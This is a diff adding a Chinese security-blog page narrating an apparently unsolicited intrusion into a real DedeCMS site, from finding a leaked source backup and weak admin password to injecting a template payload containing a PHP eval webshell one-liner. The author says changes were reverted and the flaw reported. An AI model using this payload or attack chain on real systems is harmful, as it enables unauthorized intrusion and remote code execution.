@@ -1,0 +1,265 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>记一次从源码泄露到getshell | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    记一次从源码泄露到getshell
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-12-24 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/u6omW3BTp/" class="post-tags">
+                            # 渗透测试
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="记一次从源码泄露到getshell">记一次从源码泄露到getshell</h2>
+<h3 id="前言">前言：</h3>
+<p>首发于先知社区：<a href="https://xz.aliyun.com/t/10692">记一次从源码泄露到getshell</a></p>
+<p>此次渗透中的所有修改已经复原，且漏洞已经提交至cnvd平台</p>
+<h3 id="源码泄露">源码泄露</h3>
+<p>在一个月黑风高的夜晚，闲来无事的我又开着脚本利用hunter进行互联网站点源码的扫描</p>
+<p>在查看备份文件扫描结果时，看到了宝贝</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/91cfc6c7e0bd5481e446f2a9ff93a9ee.png" alt="image-20211214193708639" loading="lazy"></figure>
+<p>二话不说，访问下载得到源码！</p>
+<p><strong>可以在注释信息处发现dedecms的痕迹</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/1f31393b0a728aaf455b7c37c6796fb1.png" alt="image-20211214193751676" loading="lazy"></figure>
+<h4 id="敏感信息泄露">敏感信息泄露</h4>
+<p><strong>获得源码的第一步当然是获取敏感信息</strong></p>
+<p>先尝试全局搜索（crtl+shift+f）关键词</p>
+<pre><code>key
+pwd
+passwd
+password
+</code></pre>
+<p>1.数据库信息泄露</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/f76e46031b530c721568188440be0ef2.png" alt="image-20211214181425720" loading="lazy"></figure>
+<p>2.后台管理员密码泄露</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/fb42d932b861613424722eb731039004.png" alt="image-20211214183126309" loading="lazy"></figure>
+<p>md5解密尝试解密，居然是一个弱口令</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/dee702f45d9f7ef8e4b3c64fb4f9a029.png" alt="image-20211214183057010" loading="lazy"></figure>
+<p>有了账户密码后当然是要找到后台管理地址，那么有了源码后台管理地址还不是手到擒来？</p>
+<h3 id="后台rce-getshell">后台RCE-&gt;getshell</h3>
+<p>源码中找到后台地址（居然改了个888）</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/b36c36cd184d8e12261c89f1f0935fa2.png" alt="image-20211214201708314" loading="lazy"></figure>
+<p>用泄露的admin/admin888进入后台后，发现版本信息为dedecms PS1</p>
+<h4 id="历史漏洞">历史漏洞</h4>
+<p>查找SP1历史漏洞都是远程代码包含漏洞，但是这个站点已经将关键文件install.php删除（源码中不存在）</p>
+<p>抱着侥幸心里又去尝试访问l一下（说不定后来又加上了呢）确实不存在，只能继续查看其他功能点</p>
+<p>然后也尝试测试了许多SP2的漏洞payload但均失败</p>
+<h4 id="继续测试其他点">继续测试其他点</h4>
+<p>继续查看发现系统设置-&gt;系统基本参数-&gt;其他选项中有模板引擎的禁用函数</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/8d8c7f7e900d10de1551331310e58707.png" alt="image-20211214194020145" loading="lazy"></figure>
+<p>但是明明没有模板引擎功能他为什么要禁用呢？</p>
+<p>我带着这个疑问又重新翻看源码</p>
+<p>果然又找到<strong>模板相关文件</strong>，（说明只是功能点被隐藏，文件依旧还在）</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/5f93c52038f0c4de1330934e771c3cb8.png" alt="image-20211214194129962" loading="lazy"></figure>
+<p>尝试访问，成功访问到并且能够正常执行</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/c81a51a33cd132ab58c0bf681aafce53.png" alt="image-20211214194202553" loading="lazy"></figure>
+<p>那么就好办了，根据dedecms模板规则，后台模板写入payload，访问即可执行PHP代码</p>
+<pre><code>{dede:field name='source' runphp='yes'}@eval($_POST['lyy']);{/dede:field}
+//调用方式 [field:字段名/] 这里的关键是runphp='yes'
+//php代码则是简单的一句话
+</code></pre>
+<p>然后去将其他选项中的禁用函数全部删除保存</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/24e3196a8503b024cdec16fb9d106265.png" alt="image-20211214192831313" loading="lazy"></figure>
+<p>因为注入到了index.htm</p>
+<p>所以连接webshell 的 url为首页</p>
+<pre><code>http://xxxxx:9890/index.php
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/38acf60aeb723ecacb760b0b93095a79.png" alt="image-20211214193411871" loading="lazy"></figure>
+<p>成功getshell</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/5abee7cb5820727134a7e04c7076f3e5.png" alt="image-20211214194742332" loading="lazy"></figure>
+<p>本来还应该通过<strong>源码泄露得到的数据库账户密码尝试连接数据库</strong>的，但这里删shell跑路太急了就忘记了测了</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+
+        
+            <span id="/post/art1/" class="leancloud_visitors" data-flag-title="记一次从源码泄露到getshell">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
